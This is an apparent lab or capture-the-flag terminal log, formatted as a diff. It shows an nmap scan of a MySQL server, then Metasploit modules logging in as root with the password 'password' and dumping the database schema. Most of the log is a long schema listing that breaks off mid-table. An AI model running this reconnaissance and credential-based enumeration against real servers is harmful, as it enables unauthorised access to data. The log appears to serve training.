@@ -1,0 +1,1340 @@
+ ──(doc730㉿kali)-[~]
+└─$ sudo nmap -sS -T4 -A -p- 10.10.248.199 -oN nmap_mysql.txt           <---------------------- (scan for target port)
+
+[sudo] password for doc730: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 00:53 PST
+Nmap scan report for 10.10.248.199
+Host is up (0.31s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d (RSA)
+|   256 30:bd:be:28:bd:32:dc:f6:ff:28:b2:57:57:31:d9:cf (ECDSA)
+|_  256 f2:3b:82:4a:5c:d2:18:19:89:1f:cd:92:0a:c7:cf:65 (ED25519)
+3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1                      <------------------------------ (Target port)
+| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
+| Not valid before: 2020-04-23T10:13:27
+|_Not valid after:  2030-04-21T10:13:27
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.29-0ubuntu0.18.04.1
+|   Thread ID: 35
+|   Capabilities flags: 65535
+|   Some Capabilities: SupportsLoadDataLocal, LongColumnFlag, SupportsCompression, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, Support41Auth, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, LongPassword, InteractiveClient, ODBCClient, Speaks41ProtocolOld, FoundRows, IgnoreSigpipes, SupportsTransactions, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: (:\x05OnA\x0F vp0u	L+_Xv{\x15
+|_  Auth Plugin Name: mysql_native_password
+|_ssl-date: TLS randomness does not represent time
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=12/22%OT=22%CT=1%CU=38100%PV=Y%DS=2%DC=T%G=Y%TM=676
+OS:6F370%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
+OS:)OPS(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M50
+OS:9ST11NW6%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3
+OS:)ECN(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
+OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
+OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
+OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
+OS:0%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 110/tcp)
+HOP RTT       ADDRESS
+1   452.12 ms 10.21.0.1
+2   452.35 ms 10.10.248.199
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 248.61 seconds
+-------------------------------------------------------------------------------------------------------                                                                                                                           
+┌──(doc730㉿kali)-[~]
+└─$ mysql --skip-ssl -h 10.10.248.199 -u root -p             
+
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 42
+Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Support MariaDB developers by giving a star at https://github.com/MariaDB/server
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> exit
+Bye
+
+______________________________________________________________________________________________
+
+┌──(doc730㉿kali)-[~]
+└─$ msfconsole -q                                            
+msf6 > search mysql_sql
+
+Matching Modules
+================
+
+   #  Name                             Disclosure Date  Rank    Check  Description
+   -  ----                             ---------------  ----    -----  -----------
+   0  auxiliary/admin/mysql/mysql_sql  .                normal  No     MySQL SQL Generic Query
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/mysql/mysql_sql
+
+msf6 > use 0
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf6 auxiliary(admin/mysql/mysql_sql) > options
+
+Module options (auxiliary/admin/mysql/mysql_sql):
+
+   Name  Current Setting   Required  Description
+   ----  ---------------   --------  -----------
+   SQL   select version()  yes       The SQL to execute.
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
+                                        using-metasploit.html
+   RPORT     3306             no        The target port (TCP)
+   USERNAME                   no        The username to authenticate as
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
+PASSWORD => password
+msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.248.199
+RHOSTS => 10.10.248.199
+msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
+USERNAME => root
+msf6 auxiliary(admin/mysql/mysql_sql) > set SQL "data bases"
+SQL => data bases
+msf6 auxiliary(admin/mysql/mysql_sql) > run
+[*] Running module against 10.10.248.199
+
+[*] 10.10.248.199:3306 - Sending statement: 'data bases'... <-------------(XD)
+[-] 10.10.248.199:3306 - MySQL Error: Mysql::ServerError::ParseError You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'data bases' at line 1
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/mysql/mysql_sql) > 
+
+msf6 auxiliary(admin/mysql/mysql_sql) > search mysql_schemadump
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  auxiliary/scanner/mysql/mysql_schemadump  .                normal  No     MYSQL Schema Dump
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql_schemadump
+
+msf6 auxiliary(admin/mysql/mysql_sql) > use 0
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > options
+
+Module options (auxiliary/scanner/mysql/mysql_schemadump):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
+                                        using-metasploit.html
+   RPORT     3306             no        The target port (TCP)
+   THREADS   1                yes       The number of concurrent threads (max one per host)
+   USERNAME                   no        The username to authenticate as
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > search mysql_schemadump
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  auxiliary/scanner/mysql/mysql_schemadump  .                normal  No     MYSQL Schema Dump
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql_schemadump
+
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > use 0
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > options
+
+Module options (auxiliary/scanner/mysql/mysql_schemadump):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
+                                        using-metasploit.html
+   RPORT     3306             no        The target port (TCP)
+   THREADS   1                yes       The number of concurrent threads (max one per host)
+   USERNAME                   no        The username to authenticate as
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD password
+PASSWORD => password
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > set RHOSTS 10.10.248.199
+RHOSTS => 10.10.248.199
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME root
+USERNAME => root
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > run
+ - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: lock_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: rows_sent
+      ColumnType: decimal(42,0)
+    - ColumnName: rows_examined
+      ColumnType: decimal(42,0)
+    - ColumnName: rows_affected
+      ColumnType: decimal(42,0)
+    - ColumnName: full_scans
+      ColumnType: decimal(43,0)
+  - TableName: x$host_summary_by_statement_type
+    Columns:
+    - ColumnName: host
+      ColumnType: varchar(60)
+    - ColumnName: statement
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: lock_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sent
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_examined
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_affected
+      ColumnType: bigint(20) unsigned
+    - ColumnName: full_scans
+      ColumnType: bigint(21) unsigned
+  - TableName: x$innodb_buffer_stats_by_schema
+    Columns:
+    - ColumnName: object_schema
+      ColumnType: text
+    - ColumnName: allocated
+      ColumnType: decimal(43,0)
+    - ColumnName: data
+      ColumnType: decimal(43,0)
+    - ColumnName: pages
+      ColumnType: bigint(21)
+    - ColumnName: pages_hashed
+      ColumnType: bigint(21)
+    - ColumnName: pages_old
+      ColumnType: bigint(21)
+    - ColumnName: rows_cached
+      ColumnType: decimal(44,0)
+  - TableName: x$innodb_buffer_stats_by_table
+    Columns:
+    - ColumnName: object_schema
+      ColumnType: text
+    - ColumnName: object_name
+      ColumnType: text
+    - ColumnName: allocated
+      ColumnType: decimal(43,0)
+    - ColumnName: data
+      ColumnType: decimal(43,0)
+    - ColumnName: pages
+      ColumnType: bigint(21)
+    - ColumnName: pages_hashed
+      ColumnType: bigint(21)
+    - ColumnName: pages_old
+      ColumnType: bigint(21)
+    - ColumnName: rows_cached
+      ColumnType: decimal(44,0)
+  - TableName: x$innodb_lock_waits
+    Columns:
+    - ColumnName: wait_started
+      ColumnType: datetime
+    - ColumnName: wait_age
+      ColumnType: time
+    - ColumnName: wait_age_secs
+      ColumnType: bigint(21)
+    - ColumnName: locked_table
+      ColumnType: varchar(1024)
+    - ColumnName: locked_index
+      ColumnType: varchar(1024)
+    - ColumnName: locked_type
+      ColumnType: varchar(32)
+    - ColumnName: waiting_trx_id
+      ColumnType: varchar(18)
+    - ColumnName: waiting_trx_started
+      ColumnType: datetime
+    - ColumnName: waiting_trx_age
+      ColumnType: time
+    - ColumnName: waiting_trx_rows_locked
+      ColumnType: bigint(21) unsigned
+    - ColumnName: waiting_trx_rows_modified
+      ColumnType: bigint(21) unsigned
+    - ColumnName: waiting_pid
+      ColumnType: bigint(21) unsigned
+    - ColumnName: waiting_query
+      ColumnType: varchar(1024)
+    - ColumnName: waiting_lock_id
+      ColumnType: varchar(81)
+    - ColumnName: waiting_lock_mode
+      ColumnType: varchar(32)
+    - ColumnName: blocking_trx_id
+      ColumnType: varchar(18)
+    - ColumnName: blocking_pid
+      ColumnType: bigint(21) unsigned
+    - ColumnName: blocking_query
+      ColumnType: varchar(1024)
+    - ColumnName: blocking_lock_id
+      ColumnType: varchar(81)
+    - ColumnName: blocking_lock_mode
+      ColumnType: varchar(32)
+    - ColumnName: blocking_trx_started
+      ColumnType: datetime
+    - ColumnName: blocking_trx_age
+      ColumnType: time
+    - ColumnName: blocking_trx_rows_locked
+      ColumnType: bigint(21) unsigned
+    - ColumnName: blocking_trx_rows_modified
+      ColumnType: bigint(21) unsigned
+    - ColumnName: sql_kill_blocking_query
+      ColumnType: varchar(32)
+    - ColumnName: sql_kill_blocking_connection
+      ColumnType: varchar(26)
+  - TableName: x$io_by_thread_by_latency
+    Columns:
+    - ColumnName: user
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: decimal(42,0)
+    - ColumnName: total_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: min_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: decimal(24,4)
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: thread_id
+      ColumnType: bigint(20) unsigned
+    - ColumnName: processlist_id
+      ColumnType: bigint(20) unsigned
+  - TableName: x$io_global_by_file_by_bytes
+    Columns:
+    - ColumnName: file
+      ColumnType: varchar(512)
+    - ColumnName: count_read
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_read
+      ColumnType: bigint(20)
+    - ColumnName: avg_read
+      ColumnType: decimal(23,4)
+    - ColumnName: count_write
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_written
+      ColumnType: bigint(20)
+    - ColumnName: avg_write
+      ColumnType: decimal(23,4)
+    - ColumnName: total
+      ColumnType: bigint(21)
+    - ColumnName: write_pct
+      ColumnType: decimal(26,2)
+  - TableName: x$io_global_by_file_by_latency
+    Columns:
+    - ColumnName: file
+      ColumnType: varchar(512)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: count_read
+      ColumnType: bigint(20) unsigned
+    - ColumnName: read_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: count_write
+      ColumnType: bigint(20) unsigned
+    - ColumnName: write_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: count_misc
+      ColumnType: bigint(20) unsigned
+    - ColumnName: misc_latency
+      ColumnType: bigint(20) unsigned
+  - TableName: x$io_global_by_wait_by_bytes
+    Columns:
+    - ColumnName: event_name
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: min_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: count_read
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_read
+      ColumnType: bigint(20)
+    - ColumnName: avg_read
+      ColumnType: decimal(23,4)
+    - ColumnName: count_write
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_written
+      ColumnType: bigint(20)
+    - ColumnName: avg_written
+      ColumnType: decimal(23,4)
+    - ColumnName: total_requested
+      ColumnType: bigint(21)
+  - TableName: x$io_global_by_wait_by_latency
+    Columns:
+    - ColumnName: event_name
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: read_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: write_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: misc_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: count_read
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_read
+      ColumnType: bigint(20)
+    - ColumnName: avg_read
+      ColumnType: decimal(23,4)
+    - ColumnName: count_write
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_written
+      ColumnType: bigint(20)
+    - ColumnName: avg_written
+      ColumnType: decimal(23,4)
+  - TableName: x$latest_file_io
+    Columns:
+    - ColumnName: thread
+      ColumnType: varchar(149)
+    - ColumnName: file
+      ColumnType: varchar(512)
+    - ColumnName: latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: operation
+      ColumnType: varchar(32)
+    - ColumnName: requested
+      ColumnType: bigint(20)
+  - TableName: x$memory_by_host_by_current_bytes
+    Columns:
+    - ColumnName: host
+      ColumnType: varchar(60)
+    - ColumnName: current_count_used
+      ColumnType: decimal(41,0)
+    - ColumnName: current_allocated
+      ColumnType: decimal(41,0)
+    - ColumnName: current_avg_alloc
+      ColumnType: decimal(45,4)
+    - ColumnName: current_max_alloc
+      ColumnType: bigint(20)
+    - ColumnName: total_allocated
+      ColumnType: decimal(42,0)
+  - TableName: x$memory_by_thread_by_current_bytes
+    Columns:
+    - ColumnName: thread_id
+      ColumnType: bigint(20) unsigned
+    - ColumnName: user
+      ColumnType: varchar(128)
+    - ColumnName: current_count_used
+      ColumnType: decimal(41,0)
+    - ColumnName: current_allocated
+      ColumnType: decimal(41,0)
+    - ColumnName: current_avg_alloc
+      ColumnType: decimal(45,4)
+    - ColumnName: current_max_alloc
+      ColumnType: bigint(20)
+    - ColumnName: total_allocated
+      ColumnType: decimal(42,0)
+  - TableName: x$memory_by_user_by_current_bytes
+    Columns:
+    - ColumnName: user
+      ColumnType: varchar(32)
+    - ColumnName: current_count_used
+      ColumnType: decimal(41,0)
+    - ColumnName: current_allocated
+      ColumnType: decimal(41,0)
+    - ColumnName: current_avg_alloc
+      ColumnType: decimal(45,4)
+    - ColumnName: current_max_alloc
+      ColumnType: bigint(20)
+    - ColumnName: total_allocated
+      ColumnType: decimal(42,0)
+  - TableName: x$memory_global_by_current_bytes
+    Columns:
+    - ColumnName: event_name
+      ColumnType: varchar(128)
+    - ColumnName: current_count
+      ColumnType: bigint(20)
+    - ColumnName: current_alloc
+      ColumnType: bigint(20)
+    - ColumnName: current_avg_alloc
+      ColumnType: decimal(23,4)
+    - ColumnName: high_count
+      ColumnType: bigint(20)
+    - ColumnName: high_alloc
+      ColumnType: bigint(20)
+    - ColumnName: high_avg_alloc
+      ColumnType: decimal(23,4)
+  - TableName: x$memory_global_total
+    Columns:
+    - ColumnName: total_allocated
+      ColumnType: decimal(41,0)
+  - TableName: x$processlist
+    Columns:
+    - ColumnName: thd_id
+      ColumnType: bigint(20) unsigned
+    - ColumnName: conn_id
+      ColumnType: bigint(20) unsigned
+    - ColumnName: user
+      ColumnType: varchar(128)
+    - ColumnName: db
+      ColumnType: varchar(64)
+    - ColumnName: command
+      ColumnType: varchar(16)
+    - ColumnName: state
+      ColumnType: varchar(64)
+    - ColumnName: time
+      ColumnType: bigint(20)
+    - ColumnName: current_statement
+      ColumnType: longtext
+    - ColumnName: statement_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: progress
+      ColumnType: decimal(26,2)
+    - ColumnName: lock_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_examined
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sent
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_affected
+      ColumnType: bigint(20) unsigned
+    - ColumnName: tmp_tables
+      ColumnType: bigint(20) unsigned
+    - ColumnName: tmp_disk_tables
+      ColumnType: bigint(20) unsigned
+    - ColumnName: full_scan
+      ColumnType: varchar(3)
+    - ColumnName: last_statement
+      ColumnType: longtext
+    - ColumnName: last_statement_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: current_memory
+      ColumnType: decimal(41,0)
+    - ColumnName: last_wait
+      ColumnType: varchar(128)
+    - ColumnName: last_wait_latency
+      ColumnType: varchar(20)
+    - ColumnName: source
+      ColumnType: varchar(64)
+    - ColumnName: trx_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: trx_state
+      ColumnType: enum('ACTIVE','COMMITTED','ROLLED BACK')
+    - ColumnName: trx_autocommit
+      ColumnType: enum('YES','NO')
+    - ColumnName: pid
+      ColumnType: varchar(1024)
+    - ColumnName: program_name
+      ColumnType: varchar(1024)
+  - TableName: x$ps_digest_95th_percentile_by_avg_us
+    Columns:
+    - ColumnName: avg_us
+      ColumnType: decimal(21,0)
+    - ColumnName: percentile
+      ColumnType: decimal(46,4)
+  - TableName: x$ps_digest_avg_latency_distribution
+    Columns:
+    - ColumnName: cnt
+      ColumnType: bigint(21)
+    - ColumnName: avg_us
+      ColumnType: decimal(21,0)
+  - TableName: x$ps_schema_table_statistics_io
+    Columns:
+    - ColumnName: table_schema
+      ColumnType: varchar(64)
+    - ColumnName: table_name
+      ColumnType: varchar(64)
+    - ColumnName: count_read
+      ColumnType: decimal(42,0)
+    - ColumnName: sum_number_of_bytes_read
+      ColumnType: decimal(41,0)
+    - ColumnName: sum_timer_read
+      ColumnType: decimal(42,0)
+    - ColumnName: count_write
+      ColumnType: decimal(42,0)
+    - ColumnName: sum_number_of_bytes_write
+      ColumnType: decimal(41,0)
+    - ColumnName: sum_timer_write
+      ColumnType: decimal(42,0)
+    - ColumnName: count_misc
+      ColumnType: decimal(42,0)
+    - ColumnName: sum_timer_misc
+      ColumnType: decimal(42,0)
+  - TableName: x$schema_flattened_keys
+    Columns:
+    - ColumnName: table_schema
+      ColumnType: varchar(64)
+    - ColumnName: table_name
+      ColumnType: varchar(64)
+    - ColumnName: index_name
+      ColumnType: varchar(64)
+    - ColumnName: non_unique
+      ColumnType: bigint(1)
+    - ColumnName: subpart_exists
+      ColumnType: bigint(1)
+    - ColumnName: index_columns
+      ColumnType: text
+  - TableName: x$schema_index_statistics
+    Columns:
+    - ColumnName: table_schema
+      ColumnType: varchar(64)
+    - ColumnName: table_name
+      ColumnType: varchar(64)
+    - ColumnName: index_name
+      ColumnType: varchar(64)
+    - ColumnName: rows_selected
+      ColumnType: bigint(20) unsigned
+    - ColumnName: select_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_inserted
+      ColumnType: bigint(20) unsigned
+    - ColumnName: insert_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_updated
+      ColumnType: bigint(20) unsigned
+    - ColumnName: update_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_deleted
+      ColumnType: bigint(20) unsigned
+    - ColumnName: delete_latency
+      ColumnType: bigint(20) unsigned
+  - TableName: x$schema_table_lock_waits
+    Columns:
+    - ColumnName: object_schema
+      ColumnType: varchar(64)
+    - ColumnName: object_name
+      ColumnType: varchar(64)
+    - ColumnName: waiting_thread_id
+      ColumnType: bigint(20) unsigned
+    - ColumnName: waiting_pid
+      ColumnType: bigint(20) unsigned
+    - ColumnName: waiting_account
+      ColumnType: text
+    - ColumnName: waiting_lock_type
+      ColumnType: varchar(32)
+    - ColumnName: waiting_lock_duration
+      ColumnType: varchar(32)
+    - ColumnName: waiting_query
+      ColumnType: longtext
+    - ColumnName: waiting_query_secs
+      ColumnType: bigint(20)
+    - ColumnName: waiting_query_rows_affected
+      ColumnType: bigint(20) unsigned
+    - ColumnName: waiting_query_rows_examined
+      ColumnType: bigint(20) unsigned
+    - ColumnName: blocking_thread_id
+      ColumnType: bigint(20) unsigned
+    - ColumnName: blocking_pid
+      ColumnType: bigint(20) unsigned
+    - ColumnName: blocking_account
+      ColumnType: text
+    - ColumnName: blocking_lock_type
+      ColumnType: varchar(32)
+    - ColumnName: blocking_lock_duration
+      ColumnType: varchar(32)
+    - ColumnName: sql_kill_blocking_query
+      ColumnType: varchar(31)
+    - ColumnName: sql_kill_blocking_connection
+      ColumnType: varchar(25)
+  - TableName: x$schema_table_statistics
+    Columns:
+    - ColumnName: table_schema
+      ColumnType: varchar(64)
+    - ColumnName: table_name
+      ColumnType: varchar(64)
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_fetched
+      ColumnType: bigint(20) unsigned
+    - ColumnName: fetch_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_inserted
+      ColumnType: bigint(20) unsigned
+    - ColumnName: insert_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_updated
+      ColumnType: bigint(20) unsigned
+    - ColumnName: update_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_deleted
+      ColumnType: bigint(20) unsigned
+    - ColumnName: delete_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: io_read_requests
+      ColumnType: decimal(42,0)
+    - ColumnName: io_read
+      ColumnType: decimal(41,0)
+    - ColumnName: io_read_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: io_write_requests
+      ColumnType: decimal(42,0)
+    - ColumnName: io_write
+      ColumnType: decimal(41,0)
+    - ColumnName: io_write_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: io_misc_requests
+      ColumnType: decimal(42,0)
+    - ColumnName: io_misc_latency
+      ColumnType: decimal(42,0)
+  - TableName: x$schema_table_statistics_with_buffer
+    Columns:
+    - ColumnName: table_schema
+      ColumnType: varchar(64)
+    - ColumnName: table_name
+      ColumnType: varchar(64)
+    - ColumnName: rows_fetched
+      ColumnType: bigint(20) unsigned
+    - ColumnName: fetch_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_inserted
+      ColumnType: bigint(20) unsigned
+    - ColumnName: insert_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_updated
+      ColumnType: bigint(20) unsigned
+    - ColumnName: update_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_deleted
+      ColumnType: bigint(20) unsigned
+    - ColumnName: delete_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: io_read_requests
+      ColumnType: decimal(42,0)
+    - ColumnName: io_read
+      ColumnType: decimal(41,0)
+    - ColumnName: io_read_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: io_write_requests
+      ColumnType: decimal(42,0)
+    - ColumnName: io_write
+      ColumnType: decimal(41,0)
+    - ColumnName: io_write_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: io_misc_requests
+      ColumnType: decimal(42,0)
+    - ColumnName: io_misc_latency
+      ColumnType: decimal(42,0)
+    - ColumnName: innodb_buffer_allocated
+      ColumnType: decimal(43,0)
+    - ColumnName: innodb_buffer_data
+      ColumnType: decimal(43,0)
+    - ColumnName: innodb_buffer_free
+      ColumnType: decimal(44,0)
+    - ColumnName: innodb_buffer_pages
+      ColumnType: bigint(21)
+    - ColumnName: innodb_buffer_pages_hashed
+      ColumnType: bigint(21)
+    - ColumnName: innodb_buffer_pages_old
+      ColumnType: bigint(21)
+    - ColumnName: innodb_buffer_rows_cached
+      ColumnType: decimal(44,0)
+  - TableName: x$schema_tables_with_full_table_scans
+    Columns:
+    - ColumnName: object_schema
+      ColumnType: varchar(64)
+    - ColumnName: object_name
+      ColumnType: varchar(64)
+    - ColumnName: rows_full_scanned
+      ColumnType: bigint(20) unsigned
+    - ColumnName: latency
+      ColumnType: bigint(20) unsigned
+  - TableName: x$session
+    Columns:
+    - ColumnName: thd_id
+      ColumnType: bigint(20) unsigned
+    - ColumnName: conn_id
+      ColumnType: bigint(20) unsigned
+    - ColumnName: user
+      ColumnType: varchar(128)
+    - ColumnName: db
+      ColumnType: varchar(64)
+    - ColumnName: command
+      ColumnType: varchar(16)
+    - ColumnName: state
+      ColumnType: varchar(64)
+    - ColumnName: time
+      ColumnType: bigint(20)
+    - ColumnName: current_statement
+      ColumnType: longtext
+    - ColumnName: statement_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: progress
+      ColumnType: decimal(26,2)
+    - ColumnName: lock_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_examined
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_sent
+      ColumnType: bigint(20) unsigned
+    - ColumnName: rows_affected
+      ColumnType: bigint(20) unsigned
+    - ColumnName: tmp_tables
+      ColumnType: bigint(20) unsigned
+    - ColumnName: tmp_disk_tables
+      ColumnType: bigint(20) unsigned
+    - ColumnName: full_scan
+      ColumnType: varchar(3)
+    - ColumnName: last_statement
+      ColumnType: longtext
+    - ColumnName: last_statement_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: current_memory
+      ColumnType: decimal(41,0)
+    - ColumnName: last_wait
+      ColumnType: varchar(128)
+    - ColumnName: last_wait_latency
+      ColumnType: varchar(20)
+    - ColumnName: source
+      ColumnType: varchar(64)
+    - ColumnName: trx_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: trx_state
+      ColumnType: enum('ACTIVE','COMMITTED','ROLLED BACK')
+    - ColumnName: trx_autocommit
+      ColumnType: enum('YES','NO')
+    - ColumnName: pid
+      ColumnType: varchar(1024)
+    - ColumnName: program_name
+      ColumnType: varchar(1024)
+  - TableName: x$statement_analysis
+    Columns:
+    - ColumnName: query
